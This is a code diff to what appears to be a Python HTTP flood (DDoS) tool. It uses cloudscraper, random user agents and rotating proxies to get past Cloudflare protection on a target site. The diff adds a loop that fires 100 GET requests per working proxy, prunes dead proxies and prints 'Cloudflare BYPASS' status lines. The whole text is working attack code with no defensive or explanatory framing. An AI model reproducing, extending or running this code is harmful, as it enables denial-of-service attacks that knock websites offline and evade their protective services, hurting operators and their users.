@@ -60,11 +60,18 @@ def run(target, proxies, cfbp):
         proxies = {'http': 'http://' + proxy}
 
         try:
-            scraper.get(target, headers=headers, proxies=proxies, timeout=15)
-            scraper.head(target, headers=headers, proxies=proxies, timeout=15)
-            print("[%s-%s] Cloudflare BYPASS + PROXY"%(Y,C))
-        except:
-            pass
+            a = scraper.get(target, headers=headers, proxies=proxies, timeout=15)
+            print("[%s%s%s] Cloudflare BYPASS + PROXY"%(Y,a.status_code,C))
+
+            if a.status_code >= 200 and a.status_code <= 226:
+                for _ in range(100):
+                    scraper.get(target, headers=headers, proxies=proxies, timeout=15)
+            else:
+                proxies = remove_by_value(proxies, proxy)
+        
+        except requests.RequestException as e:
+            #print("Request Exception:", e)
+            proxies = remove_by_value(proxies, proxy)
     
     else:
         headers = {'User-Agent': rand_ua()}
@@ -72,9 +79,8 @@ def run(target, proxies, cfbp):
         scraper = cloudscraper.CloudScraper()
 
         try:
-            scraper.get(target, headers=headers, timeout=15)
-            scraper.head(target, headers=headers, timeout=15)
-            print("[%s-%s] Cloudflare BYPASS"%(Y,C))
+            a = scraper.get(target, headers=headers, timeout=15)
+            print("[%s%s%s] Cloudflare BYPASS"%(Y,a.status_code,C))
         except:
             pass
 
